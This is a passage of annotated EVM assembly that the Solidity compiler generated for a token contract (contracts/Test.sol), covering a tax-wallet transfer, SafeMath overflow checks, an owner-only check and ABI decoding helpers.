\"contracts/Test.sol\":12706:12733  _taxWallet.transfer(amount) */\n      dup2\n        /* \"contracts/Test.sol\":12706:12716  _taxWallet */\n      dup2\n        /* \"contracts/Test.sol\":12706:12733  _taxWallet.transfer(amount) */\n      dup2\n        /* \"contracts/Test.sol\":12726:12732  amount */\n      dup6\n        /* \"contracts/Test.sol\":12706:12716  _taxWallet */\n      dup9\n        /* \"contracts/Test.sol\":12706:12733  _taxWallet.transfer(amount) */\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_157\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"contracts/Test.sol\":991:1166  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_296:\n        /* \"contracts/Test.sol\":1049:1056  uint256 */\n      0x00\n      dup1\n        /* \"contracts/Test.sol\":1080:1085  a + b */\n      tag_357\n        /* \"contracts/Test.sol\":1084:1085  b */\n      dup4\n        /* \"contracts/Test.sol\":1080:1081  a */\n      dup6\n        /* \"contracts/Test.sol\":1080:1085  a + b */\n      tag_228\n      jump\t// in\n    tag_357:\n        /* \"contracts/Test.sol\":1068:1085  uint256 c = a + b */\n      swap1\n      pop\n        /* \"contracts/Test.sol\":1108:1109  a */\n      dup4\n        /* \"contracts/Test.sol\":1103:1104  c */\n      dup2\n        /* \"contracts/Test.sol\":1103:1109  c >= a */\n      lt\n      iszero\n        /* \"contracts/Test.sol\":1095:1141  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_343\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":14049:14051   */\n      0x20\n        /* \"contracts/Test.sol\":1095:1141  require(c >= a, \"SafeMath: addition overflow\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":14031:14052   */\n      mstore\n        /* \"#utility.yul\":14088:14090   */\n      0x1b\n        /* \"#utility.yul\":14068:14086   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":14061:14091   */\n      mstore\n        /* \"#utility.yul\":14127:14156   */\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n        /* \"#utility.yul\":14107:14125   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":14100:14157   */\n      mstore\n        /* \"#utility.yul\":14174:14192   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":1095:1141  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_146\n        /* \"#utility.yul\":13847:14198   */\n      jump\n        /* \"contracts/Test.sol\":1172:1306  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_299:\n        /* \"contracts/Test.sol\":1230:1237  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":1256:1299  sub(a, b, \"SafeMath: subtraction overflow\") */\n      tag_343\n        /* \"contracts/Test.sol\":1260:1261  a */\n      dup4\n        /* \"contracts/Test.sol\":1263:1264  b */\n      dup4\n        /* \"contracts/Test.sol\":1256:1299  sub(a, b, \"SafeMath: subtraction overflow\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n        /* \"contracts/Test.sol\":1256:1259  sub */\n      tag_141\n        /* \"contracts/Test.sol\":1256:1299  sub(a, b, \"SafeMath: subtraction overflow\") */\n      jump\t// in\n        /* \"contracts/Test.sol\":1915:2130  function div(... */\n    tag_348:\n        /* \"contracts/Test.sol\":2031:2038  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":2065:2077  errorMessage */\n      dup2\n        /* \"contracts/Test.sol\":2058:2063  b > 0 */\n      dup4\n        /* \"contracts/Test.sol\":2050:2078  require(b > 0, errorMessage) */\n      tag_364\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_146\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_364:\n      pop\n        /* \"contracts/Test.sol\":2088:2097  uint256 c */\n      0x00\n        /* \"contracts/Test.sol\":2100:2105  a / b */\n      tag_307\n        /* \"contracts/Test.sol\":2104:2105  b */\n      dup5\n        /* \"contracts/Test.sol\":2100:2101  a */\n      dup7\n        /* \"contracts/Test.sol\":2100:2105  a / b */\n      tag_342\n      jump\t// in\n        /* \"#utility.yul\":14:562   */\n    tag_33:\n        /* \"#utility.yul\":126:130   */\n      0x00\n        /* \"#utility.yul\":155:157   */\n      0x20\n        /* \"#utility.yul\":184:186   */\n      dup1\n        /* \"#utility.yul\":173:182   */\n      dup4\n        /* \"#utility.yul\":166:187   */\n      mstore\n        /* \"#utility.yul\":216:222   */\n      dup4\n        /* \"#utility.yul\":210:223   */\n      mload\n        /* \"#utility.yul\":259:265   */\n      dup1\n        /* \"#utility.yul\":254:256   */\n      0x20\n        /* \"#utility.yul\":243:252   */\n      dup6\n        /* \"#utility.yul\":239:257   */\n      add\n        /* \"#utility.yul\":232:266   */\n      mstore\n        /* \"#utility.yul\":284:285   */\n      0x00\n        /* \"#utility.yul\":294:434   */\n    tag_373:\n        /* \"#utility.yul\":308:314   */\n      dup2\n        /* \"#utility.yul\":305:306   */\n      dup2\n        /* \"#utility.yul\":302:315   */\n      lt\n        /* \"#utility.yul\":294:434   */\n      iszero\n      tag_375\n      jumpi\n        /* \"#utility.yul\":403:417   */\n      dup6\n      dup2\n      add\n        /* \"#utility.yul\":399:422   */\n      dup4\n      add\n        /* \"#utility.yul\":393:423   */\n      mload\n        /* \"#utility.yul\":369:386   */\n      dup6\n      dup3\n      add\n        /* \"#utility.yul\":388:390   */\n      0x40\n        /* \"#utility.yul\":365:391   */\n      add\n        /* \"#utility.yul\":358:424   */\n      mstore\n        /* \"#utility.yul\":323:333   */\n      dup3\n      add\n        /* \"#utility.yul\":294:434   */\n      jump(tag_373)\n    tag_375:\n        /* \"#utility.yul\":298:301   */\n      pop\n        /* \"#utility.yul\":483:484   */\n      0x00\n        /* \"#utility.yul\":478:480   */\n      0x40\n        /* \"#utility.yul\":469:475   */\n      dup3\n        /* \"#utility.yul\":458:467   */\n      dup7\n        /* \"#utility.yul\":454:476   */\n      add\n        /* \"#utility.yul\":450:481   */\n      add\n        /* \"#utility.yul\":443:485   */\n      mstore\n        /* \"#utility.yul\":553:555   */\n      0x40\n        /* \"#utility.yul\":546:548   */\n      0x1f\n        /* \"#utility.yul\":542:549   */\n      not\n        /* \"#utility.yul\":537:539   */\n      0x1f\n        /* \"#utility.yul\":529:535   */\n      dup4\n        /* \"#utility.yul\":525:540   */\n      add\n        /* \"#utility.yul\":521:550   */\n      and\n        /* \"#utility.yul\":510:519   */\n      dup6\n        /* \"#utility.yul\":506:551   */\n      add\n        /* \"#utility.yul\":502:556   */\n      add\n        /* \"#utility.yul\":494:556   */\n      swap3\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":14:562   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":567:698   */\n    tag_367:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":642:673   */\n      dup2\n      and\n        /* \"#utility.yul\":632:674   */\n      dup2\n      eq\n        /* \"#utility.yul\":622:692   */\n      tag_178\n      jumpi\n        /* \"#utility.yul\":688:689   */\n      0x00\n        /* \"#utility.yul\":685:686   */\n      dup1\n        /* \"#utility.yul\":678:690   */\n      revert\n        /* \"#utility.yul\":703:1018   */\n    tag_37:\n        /* \"#utility.yul\":771:777   */\n      0x00\n        /* \"#utility.yul\":779:785   */\n      dup1\n        /* \"#utility.yul\":832:834   */\n      0x40\n        /* \"#utility.yul\":820:829   */\n      dup4\n        /* \"#utility.yul\":811:818   */\n      dup6\n        /* \"#utility.yul\":807:830   */\n      sub\n        /* \"#utility.yul\":803:835   */\n      slt\n        /* \"#utility.yul\":800:852   */\n      iszero\n      tag_379\n      jumpi\n        /* \"#utility.yul\":848:849   */\n      0x00\n        /* \"#utility.yul\":845:846   */\n      dup1\n        /* \"#utility.yul\":838:850   */\n      revert\n        /* \"#utility.yul\":800:852   */\n    tag_379:\n        /* \"#utility.yul\":887:896   */\n      dup3\n        /* \"#utility.yul\":874:897   */\n      calldataload\n        /* \"#utility.yul\":906:937   */\n      tag_380\n        /* \"#utility.yul\":931:936   */\n      dup2\n        /* \"#utility.yul\":906:937   */\n      tag_367\n      jump\t// in\n    tag_380:\n        /* \"#utility.yul\":956:961   */\n      swap5\n        /* \"#utility.yul\":1008:1010   */\n      0x20\n        /* \"#utility.yul\":993:1011   */\n      swap4\n      swap1\n      swap4\n      add\n        /* \"#utility.yul\":980:1012   */\n      calldataload\n      swap4\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":703:1018   */\n      jump\t// out\n        /* \"#utility.yul\":1397:1853   */\n    tag_53:\n        /* \"#utility.yul\":1474:1480   */\n      0x00\n        /* \"#utility.yul\":1482:1488   */\n      dup1\n        /* \"#utility.yul\":1490:1496   */\n      0x00\n        /* \"#utility.yul\":1543:1545   */\n      0x60\n        /* \"#utility.yul\":1531:1540   */\n      dup5\n        /* \"#utility.yul\":1522:1529   */\n      dup7\n        /* \"#utility.yul\":1518:1541   */\n      sub\n        /* \"#utility.yul\":1514:1546   */\n      slt\n        /* \"#utility.yul\":1511:1563   */\n      iszero\n      tag_384\n      jumpi\n        /* \"#utility.yul\":1559:1560   */\n      0x00\n        /* \"#utility.yul\":1556:1557   */\n      dup1\n        /* \"#utility.yul\":1549:1561   */\n      revert\n        /* \"#utility.yul\":1511:1563   */\n    tag_384:\n        /* \"#utility.yul\":1598:1607   */\n      dup4\n        /* \"#utility.yul\":1585:1608   */\n      calldataload\n        /* \"#utility.yul\":1617:1648   */\n      tag_385\n        /* \"#utility.yul\":1642:1647   */\n      dup2\n        /* \"#utility.yul\":1617:1648   */\n      tag_367\n      jump\t// in\n    tag_385:\n        /* \"#utility.yul\":1667:1672   */\n      swap3\n      pop\n        /* \"#utility.yul\":1724:1726   */\n      0x20\n        /* \"#utility.yul\":1709:1727   */\n      dup5\n      add\n        /* \"#utility.yul\":1696:1728   */\n      calldataload\n        /* \"#utility.yul\":1737:1770   */\n      tag_386\n        /* \"#utility.yul\":1696:1728   */\n      dup2\n        /* \"#utility.yul\":1737:1770   */\n      tag_367\n      jump\t// in\n    tag_386:\n        /* \"#utility.yul\":1397:1853   */\n      swap3\n      swap6\n        /* \"#utility.yul\":1789:1796   */\n      swap3\n      swap5\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":1843:1845   */\n      0x40\n        /* \"#utility.yul\":1828:1846   */\n      swap2\n      swap1\n      swap2\n      add\n        /* \"#utility.yul\":1815:1847   */\n      calldataload\n      swap1\n        /* \"#utility.yul\":1397:1853   */\n      jump\t// out\n        /* \"#utility.yul\":2255:2502   */\n    tag_72:\n        /* \"#utility.yul\":2314:2320   */\n      0x00\n        /* \"#utility.yul\":2367:2369   */\n      0x20\n        /* \"#utility.yul\":2355:2364   */\n      dup3\n        /* \"#utility.yul\":2346:2353   */\n      dup5\n        /* \"#utility.yul\":2342:2365   */\n      sub\n        /* \"#utility.yul\":2338:2370   */\n      slt\n        /* \"#utility.yul\":2335:2387   */\n      iszero\n      tag_390\n      jumpi\n        /* \"#utility.yul\":2383:2384   */\n      0x00\n        /* \"#utility.yul\":2380:2381   */\n      dup1\n        /* \"#utility.yul\":2373:2385   */\n      revert\n        /* \"#utility.yul\":2335:2387   */\n    tag_390:\n        /* \"#utility.yul\":2422:2431   */\n      dup2\n        /* \"#utility.yul\":2409:2432   */\n      calldataload\n        /* \"#utility.yul\":2441:2472   */\n      tag_343\n        /* \"#utility.yul\":2466:2471   */\n      dup2\n        /* \"#utility.yul\":2441:2472   */\n      tag_367\n      jump\t// in\n        /* \"#utility.yul\":2507:2687   */\n    tag_106:\n        /* \"#utility.yul\":2566:2572   */\n      0x00\n        /* \"#utility.yul\":2619:2621   */\n      0x20\n        /* \"#utility.yul\":2607:2616   */\n      dup3\n        /* \"#utility.yul\":2598:2605   */\n      dup5\n        /* \"#utility.yul\":2594:2617   */\n      sub\n        /* \"#utility.yul\":2590:2622   */\n      slt\n        /* \"#utility.yul\":2587:2639   */\n      iszero\n      tag_393\n      jumpi\n        /* \"#utility.yul\":2635:2636   */\n      0x00\n        /* \"#utility.yul\":2632:2633   */\n      dup1\n        /* \"#utility.yul\":2625:2637   */\n      revert\n        /* \"#utility.yul\":2587:2639   */\n    tag_393:\n      pop\n        /* \"#utility.yul\":2658:2681   */\n      calldataload\n      swap2\n        /* \"#utility.yul\":2507:2687   */\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2692:3080   */\n    tag_118:\n        /* \"#utility.yul\":2760:2766   */\n      0x00\n        /* \"#utility.yul\":2768:2774   */\n      dup1\n        /* \"#utility.yul\":2821:2823   */\n      0x40\n        /* \"#utility.yul\":2809:2818   */\n      dup4\n        /* \"#utility.yul\":2800:2807   */\n      dup6\n        /* \"#utility.yul\":2796:2819   */\n      sub\n        /* \"#utility.yul\":2792:2824   */\n      slt\n        /* \"#utility.yul\":2789:2841   */\n      iszero\n      tag_395\n      jumpi\n        /* \"#utility.yul\":2837:2838   */\n      0x00\n        /* \"#utility.yul\":2834:2835   */\n      dup1\n        /* \"#utility.yul\":2827:2839   */\n      revert\n        /* \"#utility.yul\":2789:2841   */\n    tag_395:\n        /* \"#utility.yul\":2876:2885   */\n      dup3\n        /* \"#utility.yul\":2863:2886   */\n      calldataload\n        /* \"#utility.yul\":2895:2926   */\n      tag_396\n        /* \"#utility.yul\":2920:2925   */\n      dup2\n        /* \"#utility.yul\":2895:2926   */\n      tag_367\n      jump\t// in\n    tag_396:\n        /* \"#utility.yul\":2945:2950   */\n      swap2\n      pop\n        /* \"#utility.yul\":3002:3004   */\n      0x20\n        /* \"#utility.yul\":2987:3005   */\n      dup4\n      add\n        /* \"#utility.yul\":2974:3006   */\n      calldataload\n        /* \"#utility.yul\":3015:3048   */\n      tag_397\n        /* \"#utility.yul\":2974:3006   */\n      dup2\n        /* \"#utility.yul\":3015:3048   */\n      tag_367\n      jump\t// in\n    tag_397:\n        /* \"#utility.yul\":3067:3074   */\n      dup1\n        /* \"#utility.yul\":3057:3074   */\n      swap2\n      pop\n      pop\n        /* \"#utility.yul\":2692:3080   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3085:3212   */\n    tag_368:\n        /* \"#utility.yul\":3146:3156   */\n      0x4e487b71\n        /* \"#utility.yul\":3141:3144   */\n      0xe0\n        /* \"#utility.yul\":3137:3157   */\n      shl\n        /* \"#utility.yul\":3134:3135   */\n      0x00\n        /* \"#utility.yul\":3127:3158   */\n      mstore\n        /* \"#utility.yul\":3177:3181   */\n      0x11\n        /* \"#utility.yul\":3174:3175   */\n      0x04\n        /* \"#utility.yul\":3167:3182   */\n      mstore\n        /* \"#utility.yul\":3201:3205   */\n      0x24\n        /* \"#utility.yul\":3198:3199   */\n      0x00\n        /* \"#utility.yul\":3191:3206   */\n      revert\n        /* \"#utility.yul\":3217:3633   */\n    tag_369:\n        /* \"#utility.yul\":3306:3307   */\n      0x01\n        /* \"#utility.yul\":3343:3348   */\n      dup2\n        /* \"#utility.yul\":3306:3307   */\n      dup2\n        /* \"#utility.yul\":3357:3627   */\n    tag_400:\n        /* \"#utility.yul\":3378:3385   */\n      dup1\n        /* \"#utility.yul\":3368:3376   */\n      dup6\n        /* \"#utility.yul\":3365:3386   */\n      gt\n        /* \"#utility.yul\":3357:3627   */\n      iszero\n      tag_402\n      jumpi\n        /* \"#utility.yul\":3437:3441   */\n      dup2\n        /* \"#utility.yul\":3433:3434   */\n      0x00\n        /* \"#utility.yul\":3429:3435   */\n      not\n        /* \"#utility.yul\":3425:3442   */\n      div\n        /* \"#utility.yul\":3419:3423   */\n      dup3\n        /* \"#utility.yul\":3416:3443   */\n      gt\n        /* \"#utility.yul\":3413:3466   */\n      iszero\n      tag_404\n      jumpi\n        /* \"#utility.yul\":3446:3464   */\n      tag_404\n      tag_368\n      jump\t// in\n    tag_404:\n        /* \"#utility.yul\":3496:3503   */\n      dup1\n        /* \"#utility.yul\":3486:3494   */\n      dup6\n        /* \"#utility.yul\":3482:3504   */\n      and\n        /* \"#utility.yul\":3479:3534   */\n      iszero\n      tag_405\n      jumpi\n        /* \"#utility.yul\":3516:3532   */\n      swap2\n      dup2\n      mul\n      swap2\n        /* \"#utility.yul\":3479:3534   */\n    tag_405:\n        /* \"#utility.yul\":3595:3617   */\n      swap4\n      dup5\n      shr\n      swap4\n        /* \"#utility.yul\":3555:3570   */\n      swap1\n      dup1\n      mul\n      swap1\n        /* \"#utility.yul\":3357:3627   */\n      jump(tag_400)\n    tag_402:\n        /* \"#utility.yul\":3361:3364   */\n      pop\n        /* \"#utility.yul\":3217:3633   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3638:4444   */\n    tag_370:\n        /* \"#utility.yul\":3687:3692   */\n      0x00\n        /* \"#utility.yul\":3717:3725   */\n      dup3\n        /* \"#utility.yul\":3707:3787   */\n      tag_407\n      jumpi\n      pop\n        /* \"#utility.yul\":3758:3759   */\n      0x01\n        /* \"#utility.yul\":3772:3777   */\n      jump(tag_124)\n        /* \"#utility.yul\":3707:3787   */\n    tag_407:\n        /* \"#utility.yul\":3806:3810   */\n      dup2\n        /* \"#utility.yul\":3796:3872   */\n      tag_408\n      jumpi\n      pop\n        /* \"#utility.yul\":3843:3844   */\n      0x00\n        /* \"#utility.yul\":3857:3862   */\n      jump(tag_124)\n        /* \"#utility.yul\":3796:3872   */\n    tag_408:\n        /* \"#utility.yul\":3888:3892   */\n      dup2\n        /* \"#utility.yul\":3906:3907   */\n      0x01\n        /* \"#utility.yul\":3901:3960   */\n      dup2\n      eq\n      tag_410\n      jumpi\n        /* \"#utility.yul\":3974:3975   */\n      0x02\n        /* \"#utility.yul\":3969:4099   */\n      dup2\n      eq\n      tag_411\n      jumpi\n        /* \"#utility.yul\":3881:4099   */\n      jump(tag_409)\n        /* \"#utility.yul\":3901:3960   */\n    tag_410:\n        /* \"#utility.yul\":3931:3932   */\n      0x01\n        /* \"#utility.yul\":3922:3932   */\n      swap2\n      pop\n        /* \"#utility.yul\":3945:3950   */\n      pop\n      jump(tag_124)\n        /* \"#utility.yul\":3969:4099   */\n    tag_411:\n        /* \"#utility.yul\":4006:4009   */\n      0xff\n        /* \"#utility.yul\":3996:4004   */\n      dup5\n        /* \"#utility.yul\":3993:4010   */\n      gt\n        /* \"#utility.yul\":3990:4033   */\n      iszero\n      tag_413\n      jumpi\n        /* \"#utility.yul\":4013:4031   */\n      tag_413\n      tag_368\n      jump\t// in\n    tag_413:\n      pop\n      pop\n        /* \"#utility.yul\":4069:4070   */\n      0x01\n        /* \"#utility.yul\":4055:4071   */\n      dup3\n      shl\n        /* \"#utility.yul\":4084:4089   */\n      jump(tag_124)\n        /* \"#utility.yul\":3881:4099   */\n    tag_409:\n      pop\n        /* \"#utility.yul\":4183:4185   */\n      0x20\n        /* \"#utility.yul\":4173:4181   */\n      dup4\n        /* \"#utility.yul\":4170:4186   */\n      lt\n        /* \"#utility.yul\":4164:4167   */\n      0x0133\n        /* \"#utility.yul\":4158:4162   */\n      dup4\n        /* \"#utility.yul\":4155:4168   */\n      lt\n        /* \"#utility.yul\":4151:4187   */\n      and\n        /* \"#utility.yul\":4145:4147   */\n      0x4e\n        /* \"#utility.yul\":4135:4143   */\n      dup5\n        /* \"#utility.yul\":4132:4148   */\n      lt\n        /* \"#utility.yul\":4127:4129   */\n      0x0b\n        /* \"#utility.yul\":4121:4125   */\n      dup5\n        /* \"#utility.yul\":4118:4130   */\n      lt\n        /* \"#utility.yul\":4114:4149   */\n      and\n        /* \"#utility.yul\":4111:4188   */\n      or\n        /* \"#utility.yul\":4108:4267   */\n      iszero\n      tag_414\n      jumpi\n      pop\n        /* \"#utility.yul\":4220:4239   */\n      dup2\n      dup2\n      exp\n        /* \"#utility.yul\":4252:4257   */\n      jump(tag_124)\n        /* \"#utility.yul\":4108:4267   */\n    tag_414:\n        /* \"#utility.yul\":4299:4333   */\n      tag_415\n        /* \"#utility.yul\":4324:4332   */\n      dup4\n        /* \"#utility.yul\":4318:4322   */\n      dup4\n        /* \"#utility.yul\":4299:4333   */\n      tag_369\n      jump\t// in\n    tag_415:\n        /* \"#utility.yul\":4369:4375   */\n      dup1\n        /* \"#utility.yul\":4365:4366   */\n      0x00\n        /* \"#utility.yul\":4361:4367   */\n      not\n        /* \"#utility.yul\":4357:4376   */\n      div\n        /* \"#utility.yul\":4348:4355   */\n      dup3\n        /* \"#utility.yul\":4345:4377   */\n      gt\n        /* \"#utility.yul\":4342:4400   */\n      iszero\n      tag_417\n      jumpi\n        /* \"#utility.yul\":4380:4398   */\n      tag_417\n      tag_368\n      jump\t// in\n    tag_417:\n        /* \"#utility.yul\":4418:4438   */\n      mul\n      swap4\n        /* \"#utility.yul\":3638:4444   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4449:4589   */\n    tag_131:\n        /* \"#utility.yul\":4507:4512   */\n      0x00\n        /* \"#utility.yul\":4536:4583   */\n      tag_343\n        /* \"#utility.yul\":4577:4581   */\n      0xff\n        /* \"#utility.yul\":4567:4575   */\n      dup5\n        /* \"#utility.yul\":4563:4582   */\n      and\n        /* \"#utility.yul\":4557:4561   */\n      dup4\n        /* \"#utility.yul\":4536:4583   */\n      tag_370\n      jump\t// in\n        /* \"#utility.yul\":4594:4762   */\n    tag_133:\n        /* \"#utility.yul\":4667:4676   */\n      dup1\n      dup3\n      mul\n        /* \"#utility.yul\":4698:4707   */\n      dup2\n      iszero\n        /* \"#utility.yul\":4715:4730   */\n      dup3\n      dup3\n      div\n        /* \"#utility.yul\":4709:4731   */\n      dup5\n      eq\n        /* \"#utility.yul\":4695:4732   */\n      or\n        /* \"#utility.yul\":4685:4756   */\n      tag_124\n      jumpi\n        /* \"#utility.yul\":4736:4754   */\n      tag_124\n      tag_368\n      jump\t// in\n        /* \"#utility.yul\":4767:5123   */\n    tag_147:\n        /* \"#utility.yul\":4969:4971   */\n      0x20\n        /* \"#utility.yul\":4951:4972   */\n      dup1\n      dup3\n      mstore\n        /* \"#utility.yul\":4988:5006   */\n      dup2\n      dup2\n      add\n        /* \"#utility.yul\":4981:5011   */\n      mstore\n        /* \"#utility.yul\":5047:5081   */\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n        /* \"#utility.yul\":5042:5044   */\n      0x40\n        /* \"#utility.yul\":5027:5045   */\n      dup3\n      add\n        /* \"#utility.yul\":5020:5082   */\n      mstore\n        /* \"#utility.yul\":5114:5116   */\n      0x60\n        /* \"#utility.yul\":5099:5117   */\n      add\n      swap1\n        /* \"#utility.yul\":4767:5123   */\n      jump\t// out\n        /* \"#utility.yul\":7149:7455   */\n    tag_201:\n        /* \"#utility.yul\":7237:7243   */\n      0x00\n        /* \"#utility.yul\":7245:7251   */\n      dup1\n        /* \"#utility.yul\":7253:7259   */\n      0x00\n        /* \"#utility.yul\":7306:7308   */\n      0x60\n        /* \"#utility.yul\":7294:7303   */\n      dup5\n        /* \"#utility.yul\":7285:7292   */\n      dup7\n        /* \"#utility.yul\":7281:7304   */\n      sub\n        /* \"#utility.yul\":7277:7309   */\n      slt\n        /* \"#utility.yul\":7274:7326   */\n      iszero\n      tag_430\n      jumpi\n        /* \"#utility.yul\":7322:7323   */\n      0x00\n        /* \"#utility.yul\":7319:7320   */\n      dup1\n        /* \"#utility.yul\":7312:7324   */\n      revert\n        /* \"#utility.yul\":7274:7326   */\n    tag_430:\n        /* \"#utility.yul\":7351:7360   */\n      dup4\n        /* \"#utility.yul\":7345:7361   */\n      mload\n        /* \"#utility.yul\":7335:7361   */\n      swap3\n      pop\n        /* \"#utility.yul\":7401:7403   */\n      0x20\n        /* \"#utility.yul\":7390:7399   */\n      dup5\n        /* \"#utility.yul\":7386:7404   */\n      add\n        /* \"#utility.yul\":7380:7405   */\n      mload\n        /* \"#utility.yul\":7370:7405   */\n      swap2\n      pop\n        /* \"#utility.yul\":7445:7447   */\n      0x40\n        /* \"#utility.yul\":7434:7443   */\n      dup5\n        /* \"#utility.yul\":7430:7448   */\n      add\n        /* \"#utility.yul\":7424:7449   */\n      mload\n        /* \"#utility.yul\":7414:7449   */\n      swap1\n      pop\n        /* \"#utility.yul\":7149:7455   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":9840:9965   */\n    tag_228:\n        /* \"#utility.yul\":9905:9914   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":9926:9936   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":9923:9959   */\n      iszero\n      tag_124\n      jumpi\n        /* \"#utility.yul\":9939:9957   */\n      tag_124\n      tag_368\n      jump\t// in\n        /* \"#utility.yul\":11445:11580   */\n    tag_268:\n        /* \"#utility.yul\":11484:11487   */\n      0x00\n        /* \"#utility.yul\":11505:11522   */\n      0x01\n      dup3\n      add\n        /* \"#utility.yul\":11502:11545   */\n      tag_446\n      jumpi\n        /* \"#utility.yul\":11525:11543   */\n      tag_446\n      tag_368\n      jump\t// in\n    tag_446:\n      pop\n        /* \"#utility.yul\":11572:11573   */\n      0x01\n        /* \"#utility.yul\":11561:11574   */\n      add\n      swap1\n        /* \"#utility.yul\":11445:11580   */\n      jump\t// out\n        /* \"#utility.yul\":11585:11713   */\n    tag_308:\n        /* \"#utility.yul\":11652:11661   */\n      dup2\n      dup2\n      sub\n        /* \"#utility.yul\":11673:11684   */\n      dup2\n      dup2\n      gt\n        /* \"#utility.yul\":11670:11707   */\n      iszero\n      tag_124\n      jumpi\n        /* \"#utility.yul\":11687:11705   */\n      tag_124\n      tag_368\n      jump\t// in\n        /* \"#utility.yul\":11850:11977   */\n    tag_317:\n        /* \"#utility.yul\":11911:11921   */\n      0x4e487b71\n        /* \"#utility.yul\":11906:11909   */\n      0xe0\n        /* \"#utility.yul\":11902:11922   */\n      shl\n        /* \"#utility.yul\":11899:11900   */\n      0x00\n        /* \"#utility.yul\":11892:11923   */\n      mstore\n        /* \"#utility.yul\":11942:11946   */\n      0x32\n        /* \"#utility.yul\":11939:11940   */\n      0x04\n        /* \"#utility.yul\":11932:11947   */\n      mstore\n        /* \"#utility.yul\":11966:11970   */\n      0x24\n        /* \"#utility.yul\":11963:11964   */\n      0x00\n        /* \"#utility.yul\":11956:11971   */\n      revert\n        /* \"#utility.yul\":11982:12233   */\n    tag_321:\n        /* \"#utility.yul\":12052:12058   */\n      0x00\n        /* \"#utility.yul\":12105:12107   */\n      0x20\n        /* \"#utility.yul\":12093:12102   */\n      dup3\n        /* \"#utility.yul\":12084:12091   */\n      dup5\n        /* \"#utility.yul\":12080:12103   */\n      sub\n        /* \"#utility.yul\":12076:12108   */\n      slt\n        /* \"#utility.yul\":12073:12125   */\n      iszero\n      tag_453\n      jumpi\n        /* \"#utility.yul\":12121:12122   */\n      0x00\n        /* \"#utility.yul\":12118:12119   */\n      dup1\n        /* \"#utility.yul\":12111:12123   */\n      revert\n        /* \"#utility.yul\":12073:12125   */\n    tag_453:\n        /* \"#utility.yul\":12153:12162   */\n      dup2\n        /* \"#utility.yul\":12147:12163   */\n      mload\n        /* \"#utility.yul\":12172:12203   */\n      tag_343\n        /* \"#utility.yul\":12197:12202   */\n      dup2\n        /* \"#utility.yul\":12172:12203   */\n      tag_367\n      jump\t// in\n        /* \"#utility.yul\":12238:13218   */\n    tag_326:\n        /* \"#utility.yul\":12500:12504   */\n      0x00\n        /* \"#utility.yul\":12548:12551   */\n      0xa0\n        /* \"#utility.yul\":12537:12546   */\n      dup3\n        /* \"#utility.yul\":12533:12552   */\n      add\n        /* \"#utility.yul\":12579:12585   */\n      dup8\n        /* \"#utility.yul\":12568:12577   */\n      dup4\n        /* \"#utility.yul\":12561:12586   */\n      mstore\n        /* \"#utility.yul\":12605:12607   */\n      0x20\n        /* \"#utility.yul\":12643:12649   */\n      dup8\n        /* \"#utility.yul\":12638:12640   */\n      0x20\n        /* \"#utility.yul\":12627:12636   */\n      dup6\n        /* \"#utility.yul\":12623:12641   */\n      add\n        /* \"#utility.yul\":12616:12650   */\n      mstore\n        /* \"#utility.yul\":12686:12689   */\n      0xa0\n        /* \"#utility.yul\":12681:12683   */\n      0x40\n        /* \"#utility.yul\":12670:12679   */\n      dup6\n        /* \"#utility.yul\":12666:12684   */\n      add\n        /* \"#utility.yul\":12659:12690   */\n      mstore\n        /* \"#utility.yul\":12710:12716   */\n      dup2\n        /* \"#utility.yul\":12745:12751   */\n      dup8\n        /* \"#utility.yul\":12739:12752   */\n      mload\n        /* \"#utility.yul\":12776:12782   */\n      dup1\n        /* \"#utility.yul\":12768:12774   */\n      dup5\n        /* \"#utility.yul\":12761:12783   */\n      mstore\n        /* \"#utility.yul\":12814:12817   */\n      0xc0\n        /* \"#utility.yul\":12803:12812   */\n      dup7\n        /* \"#utility.yul\":12799:12818   */\n      add\n        /* \"#utility.yul\":12792:12818   */\n      swap2\n      pop\n        /* \"#utility.yul\":12853:12855   */\n      0x20\n        /* \"#utility.yul\":12845:12851   */\n      dup10\n        /* \"#utility.yul\":12841:12856   */\n      add\n        /* \"#utility.yul\":12827:12856   */\n      swap4\n      pop\n        /* \"#utility.yul\":12874:12875   */\n      0x00\n        /* \"#utility.yul\":12884:13079   */\n    tag_456:\n        /* \"#utility.yul\":12898:12904   */\n      dup2\n        /* 